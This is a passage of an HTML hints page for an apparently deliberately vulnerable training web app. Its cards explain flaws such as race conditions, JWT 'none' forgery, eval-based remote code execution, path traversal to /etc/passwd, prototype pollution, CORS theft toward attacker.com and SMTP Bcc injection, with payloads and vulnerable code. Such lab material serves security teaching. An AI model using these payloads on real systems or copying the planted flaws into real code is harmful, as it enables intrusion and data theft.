                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ PUT /api/user/YOUR_ID with {"role": "admin"}</p>
                    <p>‚Ä¢ POST /api/subscribe with {"isSubscribed": true}</p>
                    <p>‚Ä¢ Set {"donationTotal": 999999}</p>
                    <p>‚Ä¢ No parameter filtering or whitelist</p>
                    <p>‚Ä¢ Can modify any user field via mass assignment</p>
                </div>
            </div>
            
            <!-- Race Condition -->
            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚è±Ô∏è</span>
                    <h2 class="vuln-title">Race Condition</h2>
                </div>
                <div class="vuln-description">
                    Concurrent requests can bypass business logic checks. Donation amounts can be manipulated by rapidly submitting multiple requests.
                </div>
                <div class="hint-box">
                    When making donations, the balance update isn't atomic. If you send multiple simultaneous requests, you might be able to exploit timing windows.
                </div>
                <div class="challenge-box">
                    Can you donate $10 but have it counted multiple times? Try sending many identical POST requests at once using a script or Burp Repeater.
                </div>
                <div class="code-example">
// Not atomic!
const current = await dbGet('SELECT donationTotal FROM users WHERE id = ?');
await dbRun('UPDATE users SET donationTotal = ? WHERE id = ?', 
            [current.donationTotal + amount, userId]);
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/donate</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Send 10+ simultaneous donation requests</p>
                    <p>‚Ä¢ Use browser console: Promise.all() with fetch()</p>
                    <p>‚Ä¢ No transaction locks or mutex</p>
                    <p>‚Ä¢ Time-of-check vs time-of-use vulnerability</p>
                    <p>‚Ä¢ Can also work with coupon codes</p>
                </div>
            </div>
            
            <!-- Weak Cryptography -->
            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîë</span>
                    <h2 class="vuln-title">Weak Cryptography</h2>
                </div>
                <div class="vuln-description">
                    MD5 used for password reset tokens. Hardcoded JWT secret. Predictable session tokens. No password hashing - stored in plaintext!
                </div>
                <div class="hint-box">
                    Password reset tokens are generated using MD5 of email+timestamp. MD5 is broken and can be cracked. JWT secret is hardcoded in the source.
                </div>
                <div class="challenge-box">
                    Can you generate valid reset tokens? Can you forge JWT tokens knowing the secret? Check source code or /backup.zip for the JWT_SECRET.
                </div>
                <div class="code-example">
// MD5 is broken!
const resetToken = crypto.MD5(email + Date.now()).toString();

// Hardcoded secret
const JWT_SECRET = 'null_mystery_secret_2024';
                </div>
                <p><strong>Affected Areas:</strong></p>
                <span class="endpoint-badge">Password Reset</span>
                <span class="endpoint-badge">JWT Signing</span>
                <span class="endpoint-badge">Session Tokens</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ JWT secret: 'null_mystery_secret_2024'</p>
                    <p>‚Ä¢ Use jwt.io to forge tokens with known secret</p>
                    <p>‚Ä¢ MD5 rainbow tables can crack reset tokens</p>
                    <p>‚Ä¢ Passwords stored in plaintext (no bcrypt/argon2)</p>
                    <p>‚Ä¢ Predictable token generation = guessable tokens</p>
                </div>
            </div>
            
            <!-- Business Logic Flaws -->
            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üí∞</span>
                    <h2 class="vuln-title">Business Logic Flaws</h2>
                </div>
                <div class="vuln-description">
                    Negative donation amounts accepted. Coupons can be reused. No payment validation on subscriptions. Price manipulation via client-side values.
                </div>
                <div class="hint-box">
                    The donation system accepts negative numbers. Subscription checks for payment_token but also accepts isSubscribed flag. Coupons aren't marked as used.
                </div>
                <div class="challenge-box">
                    Can you donate -$1000 to give yourself money? Can you subscribe without paying? Can you use the same coupon code multiple times?
                </div>
                <div class="code-example">
// Accepts negative amounts!
amount = parseFloat(amount);  // No validation
await dbRun('UPDATE users SET donationTotal = donationTotal + ?', [amount]);

// Used flag never set
const coupon = await dbGet('SELECT * FROM coupons WHERE code = ?');
// Should mark as used but doesn't!
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/donate</span>
                <span class="endpoint-badge">POST /api/subscribe</span>
                <span class="endpoint-badge">POST /api/coupon/apply</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Donate: {"amount": -999999} to gain money</p>
                    <p>‚Ä¢ Subscribe: {"isSubscribed": true} bypasses payment</p>
                    <p>‚Ä¢ Coupons: TRUTHSEEKER, INNERCIRCLE50, ONEUSE99</p>
                    <p>‚Ä¢ Apply same coupon unlimited times</p>
                    <p>‚Ä¢ No server-side price verification</p>
                </div>
            </div>

            <!-- Additional 90+ Vulnerabilities -->
            
            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîì</span>
                    <h2 class="vuln-title">Session Fixation & Predictable Sessions</h2>
                </div>
                <div class="vuln-description">
                    Sessions are how websites remember who you are between requests. But what if session IDs are guessable? What if an attacker can force you to use their session ID? That's session fixation.
                </div>
                <div class="hint-box">
                    Sessions should be random and unpredictable. Look at /api/create-session - what happens when you call it multiple times? Can you spot a pattern in the session IDs generated?
                </div>
                <div class="challenge-box">
                    Can you predict the next session ID before it's created? If sessions are based on time (Date.now()), what would the next ID be? Also check /api/set-session - can you SET your own session ID?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/set-session</span>
                <span class="endpoint-badge">GET /api/create-session</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Session IDs should use crypto.randomBytes(), not Date.now()</p>
                    <p>‚Ä¢ Try creating a session, note the ID, create another - see the difference</p>
                    <p>‚Ä¢ Session fixation: attacker gives victim a session ID they control</p>
                    <p>‚Ä¢ Check if /api/set-session accepts a 'sessionId' parameter</p>
                    <p>‚Ä¢ Predictable patterns = predictable sessions = account takeover</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üé≠</span>
                    <h2 class="vuln-title">JWT Algorithm Confusion</h2>
                </div>
                <div class="vuln-description">
                    JSON Web Tokens (JWT) consist of header.payload.signature. The header specifies which algorithm verifies the signature. But what if the server accepts "none" as an algorithm? You could forge any token!
                </div>
                <div class="hint-box">
                    JWT headers contain an "alg" field. Normal values: HS256, RS256. But there's a special value "none" that means "no signature needed". Does the server validate which algorithms are acceptable?
                </div>
                <div class="challenge-box">
                    Can you create a JWT that says you're admin without knowing the secret key? Try decoding a real JWT, changing "alg" to "none", modifying the payload, and removing the signature. Will the server accept it?
                </div>
                <div class="code-example">
// Dangerous: accepts any algorithm including "none"
const decoded = jwt.decode(token);
if (decoded) return decoded;
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/auth/jwt-verify</span>
                <span class="endpoint-badge">POST /api/jwt-none</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ JWT structure: base64(header).base64(payload).base64(signature)</p>
                    <p>‚Ä¢ Decode the header - it's just base64, not encrypted</p>
                    <p>‚Ä¢ Change "alg": "HS256" to "alg": "none"</p>
                    <p>‚Ä¢ Modify payload: "role": "admin", "isSubscribed": true</p>
                    <p>‚Ä¢ Remove the signature part (keep the dots): header.payload.</p>
                    <p>‚Ä¢ Use jwt.io to decode/encode, or atob()/btoa() in browser console</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">‚è±Ô∏è</span>
                    <h2 class="vuln-title">Timing Attacks</h2>
                </div>
                <div class="vuln-description">
                    Some code compares strings character by character and stops at the first mismatch. This creates tiny time differences you can measure! If the server takes longer to respond, you've guessed more characters correctly.
                </div>
                <div class="hint-box">
                    Imagine a password check that compares "secret123" with your guess "sXXXXXXX". It matches 's', fails on 'X', returns false fast. But "seXXXXXX" matches 's' and 'e' before failing - takes slightly longer! Measure the response time.
                </div>
                <div class="challenge-box">
                    Can you discover a secret by trying each character position one at a time? Start with 'a____', 'b____', 'c____' ... measure which takes longest. That's the first character! Repeat for each position.
                </div>
                <div class="code-example">
// Vulnerable: early exit timing leak
for (let i = 0; i < secret.length; i++) {
    if (secret[i] !== guess[i]) return false;
    await sleep(50); // Timing leak!
}
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/auth/timing-attack</span>
                <span class="endpoint-badge">POST /api/compare-secret</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Send requests with different guesses and measure response times</p>
                    <p>‚Ä¢ Try: AAAAAAA, BAAAAAA, CAAAAAA... see which is slowest</p>
                    <p>‚Ä¢ Each correct character adds ~10-50ms to the response</p>
                    <p>‚Ä¢ Automate with a script that tries all characters (a-z, 0-9)</p>
                    <p>‚Ä¢ Repeat for each position until you reconstruct the whole secret</p>
                    <p>‚Ä¢ Use crypto.timingSafeEqual() to prevent this vulnerability</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üé≤</span>
                    <h2 class="vuln-title">Insecure Randomness</h2>
                </div>
                <div class="vuln-description">
                    Not all "random" is truly random! Math.random() is designed for games, not security. It's predictable - if you know the seed, you can predict all future "random" numbers. Security tokens must use cryptographic randomness.
                </div>
                <div class="hint-box">
                    The difference between Math.random() and crypto.randomBytes() is huge. One is for shuffling cards in a game, the other for generating password reset tokens. Which one does this application use?
                </div>
                <div class="challenge-box">
                    Request a password reset token from /api/reset-token multiple times. Do you notice patterns? Can you predict or brute force tokens? How many possible values could a Math.random() based 6-digit token have?
                </div>
                <div class="code-example">
// WEAK: Math.random() is NOT cryptographically secure
const token = Math.floor(Math.random() * 1000000);

// STRONG: crypto.randomBytes() IS secure
const token = crypto.randomBytes(32).toString('hex');
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/generate-token</span>
                <span class="endpoint-badge">GET /api/reset-token</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Math.random() produces numbers between 0 and 1 with limited precision</p>
                    <p>‚Ä¢ A 6-digit token from Math.random() only has 1 million possibilities</p>
                    <p>‚Ä¢ Compare: crypto random 32-byte hex = 2^256 possibilities!</p>
                    <p>‚Ä¢ Generate multiple tokens - look for patterns or sequential values</p>
                    <p>‚Ä¢ Brute force is feasible with small token spaces (000000-999999)</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üíâ</span>
                    <h2 class="vuln-title">Expression Language Injection</h2>
                </div>
                <div class="vuln-description">
                    eval() is JavaScript's most dangerous function - it executes any code you give it as if it were part of the program. If user input reaches eval(), you have Remote Code Execution (RCE). This is the holy grail of hacking.
                </div>
                <div class="hint-box">
                    Think of eval() like a magic spell that makes any text become real code. If you can control what text goes into eval(), you control what code runs on the server. Can you find endpoints that evaluate user input?
                </div>
                <div class="challenge-box">
                    Can you make the server execute operating system commands? Try /api/eval-expr with JavaScript expressions. Can you access Node.js modules like 'child_process' to run shell commands? What about reading files or environment variables?
                </div>
                <div class="code-example">
// EXTREMELY DANGEROUS
const result = eval(userInput);

// User sends: process.mainModule.require('child_process').execSync('ls')
// Server executes your OS commands!
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/deserialize</span>
                <span class="endpoint-badge">GET /api/eval-expr</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Start simple: try 7*7 or 2+2 to test if eval works</p>
                    <p>‚Ä¢ Access Node.js globals: process.cwd(), process.env, process.version</p>
                    <p>‚Ä¢ Require modules: process.mainModule.require('fs')</p>
                    <p>‚Ä¢ Read files: require('fs').readFileSync('/etc/passwd', 'utf8')</p>
                    <p>‚Ä¢ Execute commands: require('child_process').execSync('whoami').toString()</p>
                    <p>‚Ä¢ Check /api/deserialize for eval parameter in JSON body</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üèéÔ∏è</span>
                    <h2 class="vuln-title">Race Conditions</h2>
                </div>
                <div class="vuln-description">
                    Imagine two requests arriving at exactly the same microsecond. Both check if you have $100, both approve spending $75, both complete - you just spent $150 with only $100! This is a race condition.
                </div>
                <div class="hint-box">
                    Servers usually process requests one-by-one, but what if operations have delays? While one request is sleeping/waiting, another sneaks in. Both see the old state before either completes the update. Can you exploit these timing windows?
                </div>
                <div class="challenge-box">
                    Can you apply a coupon code multiple times by sending requests simultaneously? Can you increment a counter beyond its limits? Use tools like Burp Intruder, curl with & (background), or JavaScript Promise.all() to send parallel requests.
                </div>
                <div class="code-example">
// Vulnerable: No locking, delay creates race window
const balance = getUserBalance(userId);
await sleep(100);  // Race window!
if (balance >= amount) {
    setUserBalance(userId, balance - amount);
}
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/increment-counter</span>
                <span class="endpoint-badge">POST /api/transfer-funds</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Send 10 identical requests at the exact same time</p>
                    <p>‚Ä¢ Look for endpoints with delays (sleep, setTimeout, database queries)</p>
                    <p>‚Ä¢ Counter starts at 0, send 10 increments - should be 10, but might show 3!</p>
                    <p>‚Ä¢ In terminal: for i in {1..10}; do curl URL &; done</p>
                    <p>‚Ä¢ Or JavaScript: Promise.all([fetch(url), fetch(url), fetch(url)...])</p>
                    <p>‚Ä¢ Real fix needs database transactions or mutex locks</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üìä</span>
                    <h2 class="vuln-title">GraphQL Introspection & Schema Exposure</h2>
                </div>
                <div class="vuln-description">
                    APIs usually hide their internal structure, but schema exposure endpoints reveal everything - every database table, every column name, every relationship. It's like finding the blueprints to a building before you rob it.
                </div>
                <div class="hint-box">
                    Database schemas tell you exactly what data exists and how it's structured. Column names often reveal sensitive fields: 'password', 'ssn', 'credit_card_number'. With this knowledge, you can craft perfect SQL injection or IDOR attacks.
                </div>
                <div class="challenge-box">
                    Can you map out the entire database structure? Visit /api/schema or /api/graphql-schema to see all tables and columns. What sensitive data can you find? Use this knowledge to target other vulnerabilities more precisely.
                </div>
                <div class="code-example">
// Exposed schema reveals everything
app.get('/api/schema', (req, res) => {
    res.json({
        users: ['id', 'email', 'password', 'role'],
        donations: ['id', 'userId', 'amount', 'creditCard']
    });
});
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/schema</span>
                <span class="endpoint-badge">GET /api/graphql-schema</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Schema reveals table names - use these in SQL injection attacks</p>
                    <p>‚Ä¢ Column names show what data exists - target sensitive fields</p>
                    <p>‚Ä¢ Foreign keys show relationships - chain IDOR attacks across tables</p>
                    <p>‚Ä¢ GraphQL introspection query: {__schema{types{name fields{name}}}}</p>
                    <p>‚Ä¢ Document everything - this is reconnaissance gold</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üîí</span>
                    <h2 class="vuln-title">Weak Cryptography</h2>
                </div>
                <div class="vuln-description">
                    Encryption vs Hashing vs Encoding - they're all different! MD5 is NOT encryption (it's a hash, and a broken one). Storing passwords in plaintext is like leaving your house keys under the doormat with a sign saying "keys here".
                </div>
                <div class="hint-box">
                    Real password security uses bcrypt, scrypt, or Argon2 - algorithms specifically designed to be slow (this prevents brute force). MD5 is fast - you can compute billions per second! And plaintext? That's not even trying.
                </div>
                <div class="challenge-box">
                    Check /api/encrypt-data - does it use real encryption? Look at the database through SQL injection or IDOR - are passwords stored in plaintext? Can you see everyone's actual passwords? What about JWT secrets - are they hardcoded?
                </div>
                <div class="code-example">
// TERRIBLE: MD5 is NOT encryption, it's a broken hash
const "encrypted" = crypto.createHash('md5').update(password).digest('hex');

// TERRIBLE: Plaintext passwords
INSERT INTO users (password) VALUES ('password123');

// GOOD: Proper password hashing
const hash = await bcrypt.hash(password, 10);
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/encrypt-data</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ MD5 collisions are easy to generate - not secure since 1996!</p>
                    <p>‚Ä¢ Rainbow tables can reverse MD5 hashes instantly</p>
                    <p>‚Ä¢ Use SQL injection to SELECT password FROM users</p>
                    <p>‚Ä¢ Check if passwords are plaintext or hashed</p>
                    <p>‚Ä¢ JWT secret 'your-secret-key' is hardcoded in code</p>
                    <p>‚Ä¢ No salting = identical passwords have identical hashes</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üåê</span>
                    <h2 class="vuln-title">CORS Misconfiguration</h2>
                </div>
                <div class="vuln-description">
                    CORS (Cross-Origin Resource Sharing) is the browser's way of asking "Should I let evil.com read data from bank.com?" If the server says "Access-Control-Allow-Origin: *" then the answer is YES to everyone. That's bad.
                </div>
                <div class="hint-box">
                    Even worse: when the server REFLECTS your Origin header back to you! Send "Origin: https://attacker.com" and get "Access-Control-Allow-Origin: https://attacker.com" in response. Now your malicious website can steal user data.
                </div>
                <div class="challenge-box">
                    Can you create a malicious webpage that steals user data from this site? Use fetch() with credentials:'include' from your own HTML page. Does /api/sensitive-data allow your origin? Can you exfiltrate cookies or user info?
                </div>
                <div class="code-example">
// DANGEROUS: Reflects any origin
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
res.setHeader('Access-Control-Allow-Credentials', 'true');

// On attacker.com:
fetch('https://victim.com/api/sensitive-data', {
    credentials: 'include'
}).then(r => r.json()).then(data => stealData(data));
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/sensitive-data</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ CORS + credentials = ability to steal authenticated data</p>
                    <p>‚Ä¢ Test: curl -H "Origin: https://evil.com" http://target/api/sensitive-data</p>
                    <p>‚Ä¢ Check response headers for Access-Control-Allow-Origin</p>
                    <p>‚Ä¢ If it reflects your origin = exploitable!</p>
                    <p>‚Ä¢ Create test.html with fetch() to /api/sensitive-data</p>
                    <p>‚Ä¢ Open test.html - does it work? Congratulations, you've stolen data!</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity critical">CRITICAL</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üìÅ</span>
                    <h2 class="vuln-title">Local File Inclusion (LFI)</h2>
                </div>
                <div class="vuln-description">
                    Path traversal lets you "climb up" directory trees using ../../../ sequences. If the application reads files based on user input without validation, you can read ANY file on the server - source code, passwords, system files.
                </div>
                <div class="hint-box">
                    Think of the server's filesystem like a filing cabinet. You're supposed to only access the "public" drawer. But with ../ you can go up one level. Do it enough times (../../../../../../../) and you reach the root of the entire system!
                </div>
                <div class="challenge-box">
                    Can you read the server's /etc/passwd file (Linux) or C:\Windows\System32\drivers\etc\hosts (Windows)? Try /api/read-file?path=../../../etc/passwd or /api/load-template?template=../../../../etc/passwd. How many ../ do you need?
                </div>
                <div class="code-example">
// DANGEROUS: No path validation
app.get('/api/read-file', (req, res) => {
    const file = fs.readFileSync(req.query.path);
    res.send(file);
});

// User sends: ?path=../../../../etc/passwd
// Server reads: /etc/passwd instead of /app/files/something
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/load-template</span>
                <span class="endpoint-badge">GET /api/read-file</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Linux juicy files: /etc/passwd, /etc/shadow, /home/user/.ssh/id_rsa</p>
                    <p>‚Ä¢ Windows juicy files: C:\Windows\System32\drivers\etc\hosts, C:\Users\*\Desktop</p>
                    <p>‚Ä¢ Application files: server.js, package.json, .env, .git/config</p>
                    <p>‚Ä¢ Try different depths: ../, ../../, ../../../, ../../../../</p>
                    <p>‚Ä¢ Null byte bypass (may work): shell.php%00.jpg</p>
                    <p>‚Ä¢ Read source code to find more vulnerabilities!</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üéØ</span>
                    <h2 class="vuln-title">HTTP Parameter Pollution</h2>
                </div>
                <div class="vuln-description">
                    What happens when you send the same parameter multiple times? ?role=user&role=admin&role=guest - which one does the server use? Different servers handle this differently: some use first, some last, some combine them. This confusion is exploitable!
                </div>
                <div class="hint-box">
                    Filters might check the first parameter but application uses the last one. Or vice versa! Try polluting role, id, or permission parameters. Send ?role=user&role=admin - does the filter check 'user' but the app use 'admin'?
                </div>
                <div class="challenge-box">
                    Can you bypass access controls by parameter pollution? Try /api/users/filter?role=guest&role=admin - which role gets applied? Can you sneak admin parameters past validation by adding multiple values?
                </div>
                <div class="code-example">
// Which value gets used?
GET /api/users?role=user&role=admin&role=guest

// Express: req.query.role might be 'guest' (last)
// PHP: $_GET['role'] might be 'user' (first)
// ASP.NET: Could be all three as array!
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/users/filter</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Try: ?role=user&role=admin (which wins?)</p>
                    <p>‚Ä¢ Try: ?id=1&id=2&id=3 (does it filter or combine?)</p>
                    <p>‚Ä¢ Some frameworks turn this into arrays: ['user', 'admin']</p>
                    <p>‚Ä¢ URL encoding confusion: %26 is encoded & - try ?param1=value%26param2=admin</p>
                    <p>‚Ä¢ Test different parameter orders and combinations</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üç™</span>
                    <h2 class="vuln-title">Cookie Tossing</h2>
                </div>
                <div class="vuln-description">
                    Browsers send ALL cookies that match a domain, regardless of who set them. If sub.example.com sets a cookie for .example.com, the main site sees both its own cookie AND the subdomain's cookie. Which one wins? Chaos ensues!
                </div>
                <div class="hint-box">
                    When multiple cookies have the same name, the browser sends them in an unpredictable order. The application might read the wrong one! Attackers can use subdomains or path manipulation to inject their own cookie that overrides yours.
                </div>
                <div class="challenge-box">
                    Can you inject a malicious cookie that overrides a legitimate one? Check /api/set-cookie-multiple - does it set cookies with different domain/path attributes? If you can control a subdomain or related domain, you can "toss" cookies to poison the main application.
                </div>
                <div class="code-example">
// Legitimate site sets: sessionId=abc123; domain=.example.com
// Attacker's subdomain sets: sessionId=HACKED; domain=.example.com
// Browser sends BOTH: Cookie: sessionId=HACKED; sessionId=abc123
// Which does the app use?
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">GET /api/set-cookie-multiple</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Cookies with broader domain/path take precedence in some browsers</p>
                    <p>‚Ä¢ Test with DevTools: see multiple cookies with same name</p>
                    <p>‚Ä¢ If you control subdomain: inject session cookies for parent domain</p>
                    <p>‚Ä¢ Path overlap: /admin cookie vs / cookie - which wins?</p>
                    <p>‚Ä¢ Defense: use __Host- prefix (strict path/domain requirements)</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üß¨</span>
                    <h2 class="vuln-title">Prototype Pollution</h2>
                </div>
                <div class="vuln-description">
                    JavaScript objects inherit from Object.prototype. If you can modify __proto__, you can add properties that appear on EVERY object in the application! It's like poisoning the DNA that all objects inherit from.
                </div>
                <div class="hint-box">
                    Merge functions are dangerous: they copy properties from user input into objects. If user sends {"__proto__": {"isAdmin": true}}, the merge might pollute Object.prototype. Now EVERY object has isAdmin=true!
                </div>
                <div class="challenge-box">
                    Can you make yourself admin by polluting the prototype? Try /api/merge-config with JSON: {"__proto__": {"isAdmin": true}}. Then check if the application treats you as admin. Does creating a new empty object ({}) suddenly have an isAdmin property?
                </div>
                <div class="code-example">
// Vulnerable merge function
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];  // Dangerous!
    }
}

// Attack: {"__proto__": {"isAdmin": true}}
// Result: Object.prototype.isAdmin = true
// Now: ({}).isAdmin === true !!
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/merge-config</span>
                <span class="endpoint-badge">POST /api/deep-merge</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ Test in browser console: Object.prototype.test = 'polluted'</p>
                    <p>‚Ä¢ Then: ({}).test returns 'polluted' !</p>
                    <p>‚Ä¢ Payload: {"__proto__": {"isAdmin": true, "role": "admin"}}</p>
                    <p>‚Ä¢ Also try: {"constructor": {"prototype": {"isAdmin": true}}}</p>
                    <p>‚Ä¢ Check if new objects inherit your polluted properties</p>
                    <p>‚Ä¢ Can lead to auth bypass, RCE, or privilege escalation</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity medium">MEDIUM</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üî¢</span>
                    <h2 class="vuln-title">Type Confusion</h2>
                </div>
                <div class="vuln-description">
                    JavaScript's == operator is dangerously forgiving: 0 == "0" == false == null (kind of). Using == instead of === allows type coercion - JavaScript automatically converts types to make comparisons "work". This breaks security checks!
                </div>
                <div class="hint-box">
                    Admin check: if (userId == 1) - looks safe? But userId can be "1" (string), true, [1], or even {valueOf: () => 1}. They all pass! Worse: 0 == false and null == undefined. Security checks become meaningless.
                </div>
                <div class="challenge-box">
                    Can you bypass an admin check using type coercion? Try /api/is-admin with different types: {"userId": "0"}, {"userId": false}, {"userId": null}. Does sending the string "1" instead of number 1 grant you admin? What about weird values like [] or {}?
                </div>
                <div class="code-example">
// Vulnerable == comparison
if (req.body.userId == 1) {  // DANGEROUS
    return {isAdmin: true};
}

// These ALL pass the check:
// 1, "1", true, [1], {valueOf: () => 1}

// Should be ===
if (req.body.userId === 1) {  // SAFE
                </div>
                <p><strong>Affected Endpoints:</strong></p>
                <span class="endpoint-badge">POST /api/is-admin</span>
                <button class="expand-btn" onclick="toggleExpand(this)">Show More Hints</button>
                <div class="expanded-content">
                    <p style="margin-top: 15px;"><strong>Additional Clues:</strong></p>
                    <p>‚Ä¢ JavaScript quirks: 0 == false, "" == false, null == undefined</p>
                    <p>‚Ä¢ Array to number: [5] == 5, [] == 0, [[[[5]]]] == 5 !!</p>
                    <p>‚Ä¢ Try: {"userId": "0"} might bypass checks expecting 0</p>
                    <p>‚Ä¢ Try: {"userId": false} might work if check is: userId == 0</p>
                    <p>‚Ä¢ Object coercion: {valueOf: () => 1} converts to 1 with ==</p>
                    <p>‚Ä¢ Always use === for security-critical comparisons</p>
                </div>
            </div>

            <div class="vuln-card">
                <span class="severity high">HIGH</span>
                <div class="vuln-header">
                    <span class="vuln-icon">üíå</span>
                    <h2 class="vuln-title">SMTP Header Injection</h2>
                </div>
                <div class="vuln-description">
                    Email headers are separated by newlines (\n or \r\n). If you can inject a newline character into email fields, you can add your own headers: Bcc, Cc, Subject, even entire new email bodies! It's like adding extra pages to a letter after it's been "sealed".
                </div>
                <div class="hint-box">
                    The "To" field might seem safe, but what if you send: victim@test.com%0ABcc:attacker@evil.com ? The %0A is a newline - suddenly you've added a Bcc header! Now you get a copy of every email sent.
                </div>
                <div class="challenge-box">
                    Can you inject additional recipients without the user knowing? Try /api/send-email with To field containing newlines. Test: "user@example.com\nBcc: you@attacker.com" or URL-encoded: user@example.com%0ABcc:you@attacker.com. Can you hijack password reset emails?
                </div>
                <div class="code-example">
// Vulnerable email sending
const headers = `To: ${userInput}\nFrom: noreply@site.com`;

// Attack: userInput = "victim@test.com\nBcc: attacker@evil.com"
// Result:
// To: victim@test.com
// Bcc: attacker@evil.com
// From: noreply@site.com
                </div>
